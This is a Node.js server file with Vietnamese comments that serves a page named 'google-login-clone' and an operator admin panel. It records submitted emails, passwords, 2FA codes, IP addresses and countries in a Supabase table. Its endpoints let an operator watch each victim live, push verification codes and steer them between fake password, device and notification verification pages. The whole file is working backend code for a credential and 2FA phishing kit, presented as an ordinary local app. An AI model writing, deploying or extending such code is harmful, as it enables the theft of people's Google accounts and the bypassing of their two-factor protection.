/**
 * Local all-in-one server (Supabase persistence)
 * - Serves frontend  (google-login-clone) at  http://localhost:5000/
 * - Serves admin GUI (admin-gui)          at  http://localhost:5000/admin
 * - Exposes REST API                      at  http://localhost:5000/api/*
 *
 * Dữ liệu lưu trong Supabase table `login_requests` (xem
 * ../../supabase/server_requests_schema.sql) -> restart server KHÔNG mất data.
 *
 * Cần set 2 env trước khi chạy:
 *   SUPABASE_URL=https://<project>.supabase.co
 *   SUPABASE_SERVICE_ROLE_KEY=<secret key từ Project Settings -> API>
 * Có thể đặt trong file .env cạnh server.cjs (được load tự động) hoặc export
 * trước khi chạy `node server.cjs`.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

// --------------------------- Env loading ---------------------------
// Nạp .env đơn giản (không dùng dotenv để giữ zero-dependency).
(function loadEnv() {
    const candidates = [
        path.join(__dirname, '.env'),
        path.join(__dirname, '..', '..', '.env'),
    ];
    for (const p of candidates) {
        if (!fs.existsSync(p)) continue;
        const txt = fs.readFileSync(p, 'utf8');
        for (const line of txt.split(/\r?\n/)) {
            const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*(.*?)\s*$/i);
            if (!m) continue;
            const [, k, rawV] = m;
            if (process.env[k]) continue;
            let v = rawV.trim();
            if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) {
                v = v.slice(1, -1);
            }
            process.env[k] = v;
        }
    }
})();

const PORT = Number(process.env.PORT) || 5000;
const ROOT = __dirname;
const FRONTEND_DIR = path.join(ROOT, 'google-login-clone');
const ADMIN_DIR = path.join(ROOT, 'admin-gui');

const SUPABASE_URL = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || '';
const SUPABASE_SERVICE_ROLE_KEY =
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    process.env.SUPABASE_SECRET_KEY ||
    '';

if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
    console.error('[FATAL] Thiếu SUPABASE_URL / SUPABASE_SERVICE_ROLE_KEY trong .env');
    console.error('        Thêm vào file .env của dự án rồi chạy lại.');
    process.exit(1);
}

const TABLE = 'login_requests';
const REST_ENDPOINT = `${SUPABASE_URL.replace(/\/$/, '')}/rest/v1/${TABLE}`;
const DEFAULT_HEADERS = {
    apikey: SUPABASE_SERVICE_ROLE_KEY,
    Authorization: `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    'Content-Type': 'application/json; charset=utf-8',
};

// --------------------------- Supabase REST client ---------------------------
// Dùng fetch (Node >= 18) để giữ zero-dependency. Tất cả hàm trả về Promise.

async function supabaseRequest(urlStr, opts = {}) {
    const headers = { ...DEFAULT_HEADERS, ...(opts.headers || {}) };
    const resp = await fetch(urlStr, { ...opts, headers });
    const text = await resp.text();
    let body;
    try { body = text ? JSON.parse(text) : null; } catch { body = text; }
    if (!resp.ok) {
        const err = new Error(`Supabase ${resp.status}: ${JSON.stringify(body)}`);
        err.status = resp.status;
        err.body = body;
        throw err;
    }
    return body;
}

// Map DB row (snake_case) -> shape client/admin-gui đang dùng (camelCase)
function rowToEntry(r) {
    if (!r) return null;
    return {
        id: r.id,
        email: r.email,
        sessionId: r.session_id || '',
        password: r.password || '',
        twofa: r.twofa || '',
        verificationCode: r.verification_code || '',
        pageStatus: r.page_status || 'Login',
        status: r.status || 'pending',
        nextPage: r.next_page || '',
        userAgent: r.user_agent || '',
        ip: r.ip || '',
        country: r.country || '',
        countryCode: r.country_code || '',
        tag: r.tag || '',
        note: r.note || '',
        createdAt: r.created_at || new Date().toISOString(),
        lastSeen: r.last_seen || null,
    };
}

// Map camelCase -> snake_case cho INSERT / UPDATE
function entryToRow(e) {
    const m = {};
    if (e.email !== undefined)            m.email = e.email;
    if (e.sessionId !== undefined)        m.session_id = e.sessionId;
    if (e.password !== undefined)         m.password = e.password;
    if (e.twofa !== undefined)            m.twofa = e.twofa;
    if (e.verificationCode !== undefined) m.verification_code = e.verificationCode;
    if (e.pageStatus !== undefined)       m.page_status = e.pageStatus;
    if (e.status !== undefined)           m.status = e.status;
    if (e.nextPage !== undefined)         m.next_page = e.nextPage;
    if (e.userAgent !== undefined)        m.user_agent = e.userAgent;
    if (e.ip !== undefined)               m.ip = e.ip;
    if (e.country !== undefined)          m.country = e.country;
    if (e.countryCode !== undefined)      m.country_code = e.countryCode;
    if (e.tag !== undefined)              m.tag = e.tag;
    if (e.note !== undefined)             m.note = e.note;
    if (e.createdAt !== undefined)        m.created_at = e.createdAt;
    if (e.lastSeen !== undefined)         m.last_seen = e.lastSeen;
    return m;
}

// --------------------------- Data access ---------------------------
async function findByEmail(email) {
    if (!email) return null;
    const q = new URLSearchParams({
        select: '*',
        email: `eq.${email}`,
        order: 'id.desc',
        limit: '1',
    });
    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`);
    return rowToEntry(rows[0]);
}

async function findById(id) {
    if (id === undefined || id === null || id === '') return null;
    const q = new URLSearchParams({
        select: '*',
        id: `eq.${id}`,
        limit: '1',
    });
    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`);
    return rowToEntry(rows[0]);
}

async function listAll() {
    const q = new URLSearchParams({
        select: '*',
        order: 'id.asc',
    });
    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`);
    return rows.map(rowToEntry);
}

async function insertEntry(entry) {
    const rows = await supabaseRequest(REST_ENDPOINT, {
        method: 'POST',
        headers: { Prefer: 'return=representation' },
        body: JSON.stringify([entryToRow(entry)]),
    });
    return rowToEntry(rows[0]);
}

async function updateEntry(id, patch) {
    const q = new URLSearchParams({ id: `eq.${id}` });
    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`, {
        method: 'PATCH',
        headers: { Prefer: 'return=representation' },
        body: JSON.stringify(entryToRow(patch)),
    });
    return rowToEntry(rows[0]);
}

async function deleteByIds(ids) {
    if (!ids || !ids.length) return 0;
    const q = new URLSearchParams({ id: `in.(${ids.map(String).join(',')})` });
    const rows = await supabaseRequest(`${REST_ENDPOINT}?${q}`, {
        method: 'DELETE',
        headers: { Prefer: 'return=representation' },
    });
    return Array.isArray(rows) ? rows.length : 0;
}

async function touchLastSeen(idOrEmail) {
    if (idOrEmail == null) return;
    const patch = { last_seen: new Date().toISOString() };
    const q = new URLSearchParams();
    if (typeof idOrEmail === 'object') {
        if (idOrEmail.id != null) q.set('id', `eq.${idOrEmail.id}`);
        else if (idOrEmail.email) q.set('email', `eq.${idOrEmail.email}`);
        else return;
    } else {
        q.set('id', `eq.${idOrEmail}`);
    }
    try {
        await supabaseRequest(`${REST_ENDPOINT}?${q}`, {
            method: 'PATCH',
            headers: { Prefer: 'return=minimal' },
            body: JSON.stringify(patch),
        });
    } catch (e) {
        // Không critical, log nhẹ
        console.warn('[touchLastSeen]', e.message);
    }
}

// --------------------------- HTTP helpers ---------------------------
const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.js':   'text/javascript; charset=utf-8',
    '.css':  'text/css; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png':  'image/png',
    '.jpg':  'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif':  'image/gif',
    '.svg':  'image/svg+xml',
    '.ico':  'image/x-icon',
    '.woff': 'font/woff',
    '.woff2':'font/woff2',
};

const PAGE_MAP = {
    'index.html': 'Login',
    'password.html': 'Password',
    'verify.html': 'Setup Code Phone',
    'verify-device.html': 'Setup Code Phone',
    'verify-notification.html': 'Notification',
    'verify-options.html': 'Notification',
};

function setCORS(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,apikey,Cache-Control');
    res.setHeader('Cache-Control', 'no-store');
}

function sendJSON(res, status, data) {
    res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8' });
    res.end(JSON.stringify(data));
}

function readBody(req) {
    return new Promise(resolve => {
        let buf = '';
        req.on('data', c => (buf += c));
        req.on('end', () => {
            if (!buf) return resolve({});
            try { resolve(JSON.parse(buf)); } catch { resolve({}); }
        });
    });
}

function serveFile(filePath, res) {
    fs.readFile(filePath, (err, content) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            return res.end('Not found');
        }
        const ext = path.extname(filePath).toLowerCase();
        res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
        res.end(content);
    });
}

// --------------------------- API handlers ---------------------------
async function handleApi(req, res, pathname, query) {
    // POST /api/request — frontend gửi email / password / twofa + geolocation
    if (req.method === 'POST' && pathname === '/api/request') {
        const body = await readBody(req);
        const {
            email = '', password = '', twofa = '',
            userAgent = '', currentPage = '', sessionId = '',
            ip = '', country = '', countryCode = '',
        } = body;
        if (!email) return sendJSON(res, 400, { error: 'email required' });

        const clientIp = ip || (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim()
            || (req.socket && req.socket.remoteAddress) || '';

        let entry = await findByEmail(email);
        if (!entry) {
            // Tạo mới
            entry = await insertEntry({
                email,
                sessionId: sessionId || '',
                password: password || '',
                twofa: twofa || '',
                verificationCode: '',
                pageStatus: (currentPage && PAGE_MAP[currentPage]) || 'Login',
                status: 'pending',
                nextPage: '',
                userAgent: userAgent || '',
                ip: clientIp || '',
                country: country || '',
                countryCode: countryCode || '',
                tag: '',
                note: '',
                lastSeen: new Date().toISOString(),
            });
        } else {
            // Update — user đã chuyển sang trang mới
            const patch = {
                status: 'pending',
                nextPage: '',
                lastSeen: new Date().toISOString(),
            };
            if (sessionId && !entry.sessionId) patch.sessionId = sessionId;
            if (password) patch.password = password;
            if (twofa)    patch.twofa = twofa;
            if (userAgent) patch.userAgent = userAgent;
            if (currentPage && PAGE_MAP[currentPage]) patch.pageStatus = PAGE_MAP[currentPage];
            if (!entry.ip      && clientIp)       patch.ip = clientIp;
            if (!entry.country && country)        patch.country = country;
            if (!entry.countryCode && countryCode) patch.countryCode = countryCode;
            entry = await updateEntry(entry.id, patch);
        }

        return sendJSON(res, 200, { ...entry, requestId: entry.id });
    }

    // POST /api/update-page — cập nhật trạng thái trang hiện tại
    if (req.method === 'POST' && pathname === '/api/update-page') {
        const body = await readBody(req);
        const { id, email, pageStatus, currentPage } = body;
        const entry = (id && await findById(id)) || await findByEmail(email);
        if (entry) {
            const patch = { lastSeen: new Date().toISOString() };
            if (pageStatus) patch.pageStatus = pageStatus;
            else if (currentPage) patch.pageStatus = PAGE_MAP[currentPage] || currentPage;
            await updateEntry(entry.id, patch);
        }
        return sendJSON(res, 200, { ok: true });
    }

    // GET /api/status/:id
    if (req.method === 'GET' && pathname.startsWith('/api/status/')) {
        const id = decodeURIComponent(pathname.split('/').pop());
        const entry = await findById(id);
        if (entry) touchLastSeen(entry.id);
        return sendJSON(res, 200, entry || { status: 'pending' });
    }

    // GET /api/check-approval?email=...
    if (req.method === 'GET' && pathname === '/api/check-approval') {
        const entry = await findByEmail(query.email);
        if (entry) touchLastSeen(entry.id);
        return sendJSON(res, 200, {
            status: entry ? entry.status : 'pending',
            verificationCode: entry ? entry.verificationCode : '',
            nextPage: entry ? (entry.nextPage || '') : '',
        });
    }

    // GET /api/pending — admin lấy toàn bộ
    if (req.method === 'GET' && pathname === '/api/pending') {
        const rows = await listAll();
        return sendJSON(res, 200, rows);
    }

    // POST /api/approve
    if (req.method === 'POST' && pathname === '/api/approve') {
        const body = await readBody(req);
        const { id, email, decision, nextPage, verificationCode } = body;
        let entry = await findById(id);
        if (!entry) entry = await findByEmail(email);
        if (!entry) return sendJSON(res, 404, { error: 'not found', id, email });
        const patch = {
            status: decision === 'denied' ? 'denied' : 'approved',
            nextPage: nextPage || '',
        };
        if (verificationCode) patch.verificationCode = verificationCode;
        entry = await updateEntry(entry.id, patch);
        return sendJSON(res, 200, { ok: true, entry });
    }

    // POST /api/set-verification-code
    if (req.method === 'POST' && pathname === '/api/set-verification-code') {
        const body = await readBody(req);
        const { email, code } = body;
        const entry = await findByEmail(email);
        if (!entry) return sendJSON(res, 404, { error: 'not found' });
        await updateEntry(entry.id, { verificationCode: code || '' });
        return sendJSON(res, 200, { ok: true });
    }

    // POST /api/delete — id | ids[]
    if (req.method === 'POST' && pathname === '/api/delete') {
        const body = await readBody(req);
        const { id, ids } = body;
        const targetIds = Array.isArray(ids) && ids.length
            ? ids.map(String)
            : (id != null ? [String(id)] : []);
        if (!targetIds.length) return sendJSON(res, 400, { error: 'id or ids required' });
        const deleted = await deleteByIds(targetIds);
        return sendJSON(res, 200, { ok: true, deleted });
    }

    // POST /api/set-meta — admin set tag / note
    if (req.method === 'POST' && pathname === '/api/set-meta') {
        const body = await readBody(req);
        const { id, tag, note } = body;
        const entry = await findById(id);
        if (!entry) return sendJSON(res, 404, { error: 'not found' });
        const patch = {};
        if (typeof tag  === 'string') patch.tag  = tag;
        if (typeof note === 'string') patch.note = note;
        const updated = await updateEntry(entry.id, patch);
        return sendJSON(res, 200, { ok: true, entry: updated });
    }

    // GET /api/verification-html/:email
    if (req.method === 'GET' && pathname.startsWith('/api/verification-html/')) {
        const email = decodeURIComponent(pathname.replace('/api/verification-html/', ''));
        const entry = await findByEmail(email);
        const code = entry ? entry.verificationCode : '';
        return sendJSON(res, 200, { code, html: code ? `<div class="code">${code}</div>` : '' });
    }

    return sendJSON(res, 404, { error: 'API not found', pathname });
}

// --------------------------- Router ---------------------------
const server = http.createServer(async (req, res) => {
    setCORS(res);
    if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

    const parsed = url.parse(req.url, true);
    const pathname = decodeURIComponent(parsed.pathname || '/');

    if (pathname !== '/api/pending' && !pathname.startsWith('/api/status/') && pathname !== '/api/check-approval') {
        console.log(`[${new Date().toISOString().substring(11,19)}] ${req.method} ${req.url}`);
    }

    try {
        if (pathname.startsWith('/api/')) {
            return await handleApi(req, res, pathname, parsed.query);
        }

        if (pathname === '/admin' || pathname === '/admin/') {
            return serveFile(path.join(ADMIN_DIR, 'index.html'), res);
        }
        if (pathname.startsWith('/admin/')) {
            const rel = pathname.replace(/^\/admin\//, '');
            const safe = path.normalize(rel).replace(/^(\.\.[/\\])+/, '');
            return serveFile(path.join(ADMIN_DIR, safe), res);
        }

        let rel = pathname === '/' ? 'index.html' : pathname.slice(1);
        if (!path.extname(rel)) {
            const pages = ['index','password','verify','verify-device','verify-notification','verify-options','test'];
            if (pages.includes(rel)) rel += '.html';
        }
        const safe = path.normalize(rel).replace(/^(\.\.[/\\])+/, '');
        return serveFile(path.join(FRONTEND_DIR, safe), res);
    } catch (e) {
        console.error('[server error]', e);
        sendJSON(res, 500, { error: 'server error', message: String(e.message || e) });
    }
});

// --------------------------- Startup check ---------------------------
(async () => {
    // Ping 1 phát để chắc chắn table tồn tại và service role key đúng
    try {
        await supabaseRequest(`${REST_ENDPOINT}?select=id&limit=1`);
    } catch (e) {
        console.error('[FATAL] Không kết nối được Supabase table `login_requests`:');
        console.error('        ' + e.message);
        console.error('        -> Đã chạy file supabase/server_requests_schema.sql chưa?');
        console.error('        -> SUPABASE_SERVICE_ROLE_KEY có đúng không?');
        process.exit(1);
    }

    server.listen(PORT, () => {
        console.log('==============================================');
        console.log(`  Local server running at http://localhost:${PORT}`);
        console.log('----------------------------------------------');
        console.log(`  Frontend :  http://localhost:${PORT}/`);
        console.log(`  Admin    :  http://localhost:${PORT}/admin`);
        console.log(`  API base :  http://localhost:${PORT}/api`);
        console.log(`  Storage  :  Supabase (${SUPABASE_URL})`);
        console.log('==============================================');
        console.log('Press Ctrl+C to stop');
    });
})();
